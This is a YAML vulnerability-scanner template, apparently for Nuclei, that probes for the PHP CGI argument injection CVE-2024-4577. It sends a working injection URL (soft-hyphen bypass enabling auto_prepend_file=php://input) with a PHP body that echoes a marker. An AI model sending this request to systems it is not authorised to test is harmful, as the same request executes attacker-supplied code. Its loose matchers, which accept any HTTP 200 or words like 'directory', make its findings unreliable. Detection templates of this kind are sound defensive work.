id: CVE-2024-4577
info:
  name: CVE-2024-4577 PHP CGI Argument Injection
  severity: high
  description: Detects potential PHP CGI argument injection vulnerability.
  reference:
    - https://example.com/cve-2024-4577
  tags: cve,2024,php,cgi,injection

requests:
  - method: POST
    paths:
      - /cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
      - /php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
    headers:
      Content-Type: application/x-www-form-urlencoded
    data: "<?php echo \"vulnerable\"; ?>"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - vulnerable
          - directory
          - index of
        part: body
      - type: status
        status:
          - 200